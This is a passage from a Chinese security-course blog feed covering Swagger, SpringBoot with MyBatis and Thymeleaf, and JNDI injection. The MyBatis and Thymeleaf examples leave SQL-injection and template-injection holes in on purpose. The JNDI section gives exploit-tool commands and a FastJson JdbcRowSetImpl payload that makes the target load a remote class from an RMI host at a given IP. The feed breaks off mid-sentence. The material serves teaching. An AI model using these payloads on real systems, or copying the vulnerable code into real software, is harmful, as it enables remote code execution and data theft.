title="SpringBoot-接口系统-Swagger"></a>SpringBoot-接口系统-Swagger</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Swagger是当下比较流行的实时接口文文档生成工具。接口文档是当前前后端分离项目中必不可少的工具，在前后端开发之前，后端要先出接口文档，前端根据接口文档来进行项目的开发，双方开发结束后在进行联调测试。<br>参考：<a href="https://blog.csdn.net/lsqingfeng/article/details/123678701">https://blog.csdn.net/lsqingfeng/article/details/123678701</a>  </p><h3 id="开发使用"><a href="#开发使用" class="headerlink" title="开发使用"></a>开发使用</h3><ul><li><p>1、引入依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;--<span class="number">2.9</span><span class="number">.2</span>版本--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;--<span class="number">3.0</span><span class="number">.0</span>版本--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li><li><p>2、配置访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#application.properties</span><br><span class="line">spring.mvc.pathmatch.matching-strategy=ant-path-matcher</span><br><span class="line"></span><br><span class="line">#application.yml</span><br><span class="line">spring</span><br><span class="line">  mvc:</span><br><span class="line">    pathmatch:</span><br><span class="line">      matching-strategy: ant_path_matcher</span><br></pre></td></tr></table></figure><p>2.X版本启动需要注释@EnableSwagger2<br>3.X版本不需注释，写的话是@EnableOpenApi<br>2.X访问路径：<a href="http://ip:port/swagger-ui.html">http://ip:port/swagger-ui.html</a><br>3.X访问路径：<a href="http://ip:port/swagger-ui/index.html">http://ip:port/swagger-ui/index.html</a>  </p></li><li><p>3、安全问题<br>自动化测试：Postman<br>泄漏应用接口：用户登录，信息显示，上传文件等<br>可用于对未授权访问，信息泄漏，文件上传等安全漏洞的测试.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>38安全开发-JavaEE应用-SpringBoot</title>
      <link href="/2023/10/18/38%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/38%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>44、JavaEE-SpringBoot-WebAPP&amp;路由</li><li>45、JavaEE-SpringBoot-Mybatis&amp;注入</li><li>46、JavaEE-SpringBoot-Thymeleaf&amp;SSTI</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li></ul><h2 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Spring Boot是由Pivotal团队提供的一套开源框架，可以简化spring应用的创建及部署。它提供了丰富的Spring模块化支持，可以帮助开发者更轻松快捷地构建出企业级应用。Spring Boot通过自动配置功能，降低了复杂性，同时支持基于JVM的多种开源框架，可以缩短开发时间，使开发更加简单和高效。</p><h2 id="SpringBoot-Web应用-路由响应"><a href="#SpringBoot-Web应用-路由响应" class="headerlink" title="SpringBoot-Web应用-路由响应"></a>SpringBoot-Web应用-路由响应</h2><p>参考：<a href="https://springdoc.cn/spring-boot/">https://springdoc.cn/spring-boot/</a>  </p><ul><li>1、路由映射  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping @GetMapping等  </span><br></pre></td></tr></table></figure></li><li>2、参数传递  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@RequestParam  </span><br></pre></td></tr></table></figure></li><li>3、数据响应  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span> <span class="meta">@Controller</span>  </span><br><span class="line"><span class="meta">@RestController</span>注解相当于<span class="meta">@ResponseBody</span>＋<span class="meta">@Controller</span>合在一起的作用。  (需要<span class="keyword">return</span>时使用)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="comment">//无参数访问响应</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/xiaodi&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello xiaodi&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//无参数指向GET方法访问响应</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/get&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">helloGet</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello get xiadi&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//有参数指向GET方法访问响应</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/getp&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hellogetp</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello get &quot;</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//有参数指向POST方法访问响应</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/getpost&quot;,method = RequestMethod.POST)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">helloGetParameters</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello POST &quot;</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="SpringBoot-数据库应用-Mybatis"><a href="#SpringBoot-数据库应用-Mybatis" class="headerlink" title="SpringBoot-数据库应用-Mybatis"></a>SpringBoot-数据库应用-Mybatis</h2><ul><li><p>1、数据库先创建需操作的数据  </p></li><li><p>2、项目添加Mybatis&amp;数据库驱动    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-pom.xml</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.mysql&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li><li><p>3、项目配置数据库连接信息  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-application.yml</span><br><span class="line">spring:</span><br><span class="line">  datasource:</span><br><span class="line">    url: jdbc:mysql:<span class="comment">//localhost:3306/demo01</span></span><br><span class="line">    username: root</span><br><span class="line">    password: <span class="number">123456</span></span><br><span class="line">    driver-class-name: com.mysql.cj.jdbc.Driver</span><br></pre></td></tr></table></figure></li><li><p>4、创建User类用来操作数据库数据<br>-com.example.demo.entity.User<br>set get toString方法  </p></li><li><p>5、创建Mapper动态接口代理类实现  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-com.example.demo.mapper.UserMapper  </span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from admin where id like &#x27;%$&#123;id&#125;%&#x27;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">(Integer id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>6、创建Controller实现Web访问调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-com.example.demo.controller.UserController</span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/getdata&quot;,method = RequestMethod.GET)</span></span><br><span class="line">    <span class="comment">//@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getdata</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">        List&lt;User&gt; all = userMapper.findAll(id);</span><br><span class="line">        System.out.println(all);</span><br><span class="line">        <span class="keyword">return</span> all;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="SpringBoot-模版引擎-Thymeleaf"><a href="#SpringBoot-模版引擎-Thymeleaf" class="headerlink" title="SpringBoot-模版引擎-Thymeleaf"></a>SpringBoot-模版引擎-Thymeleaf</h2><p>-不安全的模版版本<br>日常开发中：语言切换页面，主题更换等传参导致的SSTI注入安全问题<br>漏洞参考：<a href="https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg">https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg</a><br>(Thymeleaf漏洞参考)<br>配置application.properties指向模版页面<br>spring.thymeleaf.prefix&#x3D;classpath:&#x2F;templates&#x2F;<br>spring.thymeleaf.suffix&#x3D;.html  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;hello xiaodi&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@GetMapping(&quot;/path&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">thymeleaf</span><span class="params">(String lang)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> lang;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">    xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;java-spring-thymeleaf&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;</span><br><span class="line">        &lt;!--latest--&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">2.2</span><span class="number">.0</span>.RELEASE&lt;/version&gt;</span><br><span class="line">    &lt;/parent&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;java.version&gt;<span class="number">1.8</span>&lt;/java.version&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>37安全开发-JavaEE应用</title>
      <link href="/2023/10/18/37%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/37%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>41、JavaEE-JNDI注入-RMI&amp;LDAP</li><li>42、JavaEE-漏洞结合-FastJson链</li><li>43、JavaEE-漏洞条件-JDK版本绕过</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li></ul><p> <img src="/2023/10/18/37%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/JNDI2.png"><br> <img src="/2023/10/18/37%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/JNDI3.png"></p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>思考明白：<br>什么是jndi注入<br>为什么有jndi注入<br>JDNI注入安全问题<br>JDNI注入利用条件<br>参考：<a href="https://blog.csdn.net/dupei/article/details/120534024">https://blog.csdn.net/dupei/article/details/120534024</a>  </p><h2 id="JNDI注入-RMI-LDAP服务"><a href="#JNDI注入-RMI-LDAP服务" class="headerlink" title="JNDI注入-RMI&amp;LDAP服务"></a>JNDI注入-RMI&amp;LDAP服务</h2><p>[将JNDI规范看成是一个让配置参数和代码解耦的一种规范和思想会更好理解一些。比如说常见的在DAO层通过原始的JDBC来连接数据库，我们可以选择在代码中直接写入数据库的连接参数，但一旦数据源发生变更，我们就势必要改动代码后重新编译才能连接新的数据源。而如果我们将数据库连接参数改成外部配置的方式，那么也就实现了配置和代码之间的解耦]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。<br>RMI：远程方法调用注册表<br>LDAP：轻量级目录访问协议  </p><h3 id="调用检索："><a href="#调用检索：" class="headerlink" title="调用检索："></a>调用检索：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。  javax.naming.InitialContext.lookup()(专门实现jndi注入的)</p><ul><li><p>在RMI服务中调用了InitialContext.lookup()的类有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.transaction.jta.JtaTransactionManager.readObject()</span><br><span class="line">com.sun.rowset.JdbcRowSetImpl.execute()</span><br><span class="line">javax.management.remote.rmi.RMIConnector.connect()</span><br><span class="line">org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</span><br></pre></td></tr></table></figure></li><li><p>在LDAP服务中调用了InitialContext.lookup()的类有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure></li></ul><h3 id="JNDI远程调用-JNDI-Injection"><a href="#JNDI远程调用-JNDI-Injection" class="headerlink" title="JNDI远程调用-JNDI-Injection"></a>JNDI远程调用-JNDI-Injection</h3><p>基于工具自主定义（节省下述2,4步骤）   </p><ul><li>1、使用远程调用(默认端口1389)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);</span><br><span class="line">new InitialContext().lookup(&quot;rmi://xx.xx.xx.xx:1099/Test&quot;);</span><br></pre></td></tr></table></figure></li><li>2、使用利用工具生成调用地址  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A xx.xx.xx.xx    (其实这里jndi工具会自动在服务端生成一个执行calc的class文件)</span><br></pre></td></tr></table></figure></li></ul><h3 id="JNDI远程调用-marshalsec"><a href="#JNDI远程调用-marshalsec" class="headerlink" title="JNDI远程调用-marshalsec"></a>JNDI远程调用-marshalsec</h3><ul><li>1、使用远程调用(默认端口1389)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new InitialContext().lookup(&quot;ldap://xx.xx.xx.xx:1389/Test&quot;);</span><br><span class="line">new InitialContext().lookup(&quot;rmi://xx.xx.xx.xx:1099/Test&quot;);</span><br></pre></td></tr></table></figure></li><li>2、编译调用对象<br>javac Test.java</li><li>3、使用利用工具生成调用协议（rmi,ldap）  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0/#Test</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://0.0.0.0/#Test</span><br></pre></td></tr></table></figure></li><li>4、将生成的Class存放访问路径</li></ul><h3 id="JNDI-Injection-marshalsec-实现原理："><a href="#JNDI-Injection-marshalsec-实现原理：" class="headerlink" title="JNDI-Injection &amp; marshalsec 实现原理："></a>JNDI-Injection &amp; marshalsec 实现原理：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">例：RMI调用  </span><br><span class="line">//bind：将名称绑定到对象中；  </span><br><span class="line">//lookup：通过名字检索执行的对象；  </span><br><span class="line">//Reference类表示对存在于命名/目录系统以外的对象的引用。  </span><br><span class="line">//Reference参数：  </span><br><span class="line">//className：远程加载时所使用的类名；  </span><br><span class="line">//classFactory：加载的class中需要实例化类的名称；  </span><br><span class="line">//classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；  </span><br><span class="line"></span><br><span class="line">Registry registry= LocateRegistry.createRegistry(1099);</span><br><span class="line">Reference reference = new Reference(&quot;Calc&quot;, &quot;Calc&quot;, &quot;http://localhost/&quot;);</span><br><span class="line">ReferenceWrapper wrapper = new ReferenceWrapper(reference);</span><br><span class="line">registry.bind(&quot;calc&quot;, wrapper);</span><br></pre></td></tr></table></figure><h2 id="JNDI注入-FastJson漏洞结合"><a href="#JNDI注入-FastJson漏洞结合" class="headerlink" title="JNDI注入-FastJson漏洞结合"></a>JNDI注入-FastJson漏洞结合</h2><p>背景：JavaEE中接受用户提交的JSON数据进行转换(FastJson反序列化漏洞)<br>思路：利用InitialContext.lookup()中的进行JdbcRowSetImpl类JNDI服务注入<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用FastJson autotype处理Json对象的时候，未对@type字段进行完整的安全性验证，攻击者可以传入危险类，并调用危险类连接远程RMI主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器敏感信息，甚至可以利用此漏洞进一步的对服务器数据进行操作。  </p><ul><li>1、报错判断FastJson  </li><li>2、生成远程调用方法  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A 47.94.236.117</span><br></pre></td></tr></table></figure></li><li>3、提交JSON数据Payload  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.94.236.117:1099/vwaexx&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="JNDI注入-JDK高版本注入绕过"><a href="#JNDI注入-JDK高版本注入绕过" class="headerlink" title="JNDI注入-JDK高版本注入绕过"></a>JNDI注入-JDK高版本注入绕过</h2><ul><li><p>JDK 